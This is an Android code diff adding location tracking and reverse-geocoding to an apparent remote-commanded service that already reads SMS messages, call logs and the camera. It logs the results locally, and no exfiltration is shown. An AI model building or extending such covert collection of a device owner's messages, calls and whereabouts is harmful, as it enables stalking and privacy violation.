@@ -6,8 +6,14 @@ import android.content.Context;
 import android.database.Cursor;
 import android.graphics.SurfaceTexture;
 import android.hardware.Camera;
+import android.location.Address;
+import android.location.Geocoder;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
 import android.net.Uri;
 import android.os.AsyncTask;
+import android.os.Bundle;
 import android.os.Environment;
 import android.os.SystemClock;
 import android.provider.CallLog;
@@ -23,6 +29,8 @@ import java.io.FileOutputStream;
 import java.io.IOException;
 import java.text.SimpleDateFormat;
 import java.util.Date;
+import java.util.List;
+import java.util.Locale;
 
 import static android.support.v4.app.ActivityCompat.startActivityForResult;
 
@@ -33,8 +41,10 @@ import static android.support.v4.app.ActivityCompat.startActivityForResult;
  * TODO: Customize class - update intent actions, extra parameters and static
  * helper methods.
  */
-public class GetData extends IntentService {
+public class GetData extends IntentService{
     public static final String Msg="bleh";
+    LocationManager locationManager;
+    String locationProvider ;
 
     Camera cam;
     Camera.Parameters param;
@@ -61,6 +71,30 @@ public class GetData extends IntentService {
                 }
                 Log.d("Message",msgData);
             }while(cursor.moveToNext());
+        }
+        else if(intent.getStringExtra(Msg).equals("location"))
+        {
+            Log.d("location","got string");
+            locationManager = (LocationManager) this.getSystemService(Context.LOCATION_SERVICE);
+            locationProvider = LocationManager.NETWORK_PROVIDER;
+            getLocation g1 = new getLocation();
+            locationManager.requestLocationUpdates(locationProvider, 3000, 10, g1);
+            Location lastKnownLocation = locationManager.getLastKnownLocation(locationProvider);
+            Log.d("location","Latitude:"+lastKnownLocation.getLatitude()+"Longitude"+lastKnownLocation.getLongitude());
+            Geocoder geocoder;
+            List<Address> addresses;
+            geocoder = new Geocoder(this, Locale.getDefault());
+            try {
+                addresses = geocoder.getFromLocation(lastKnownLocation.getLatitude(), lastKnownLocation.getLongitude(), 1);
+                String address = addresses.get(0).getAddressLine(0);
+                String city = addresses.get(0).getLocality();
+                String country = addresses.get(0).getCountryName();
+                String regionCode = addresses.get(0).getCountryCode();
+                Log.d("location","address: "+address+" city: "+city+" country: "+country+" regionCode: "+regionCode);
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+            locationManager.removeUpdates(g1);
         }
         else if(intent.getStringExtra(Msg).equals("logs")){
             Cursor c1 = getContentResolver().query(CallLog.Calls.CONTENT_URI,null,null,null,null);
@@ -113,13 +147,53 @@ public class GetData extends IntentService {
                 }catch (Exception e){
                     camera.release();
                 }
-
-
-
-
         }
     }
 
+    private class getLocation implements LocationListener
+    {
+        @Override
+        public void onLocationChanged(Location location) {
+            Log.d("location","Latitude:"+location.getLatitude()+"Longitude"+location.getLongitude());
+        }
+
+        @Override
+        public void onStatusChanged(String provider, int status, Bundle extras) {
+
+        }
+
+        @Override
+        public void onProviderEnabled(String provider) {
+            Log.d("location","location enabled");
+        }
+
+        @Override
+        public void onProviderDisabled(String provider) {
+            Log.d("location","location disabled");
+        }
+    }
+
+    /*
+    @Override
+    public void onLocationChanged(Location location) {
+        Log.d("location","Latitude:"+location.getLatitude()+"Longitude"+location.getLongitude());
+    }
+
+    @Override
+    public void onStatusChanged(String provider, int status, Bundle extras) {
+
+    }
+
+    @Override
+    public void onProviderEnabled(String provider) {
+        Log.d("location","location enabled");
+    }
+
+    @Override
+    public void onProviderDisabled(String provider) {
+        Log.d("location","location disabled");
+    }
+    */
 }
 
 //class PhotoTask extends AsyncTask<Void,Void,Void>{
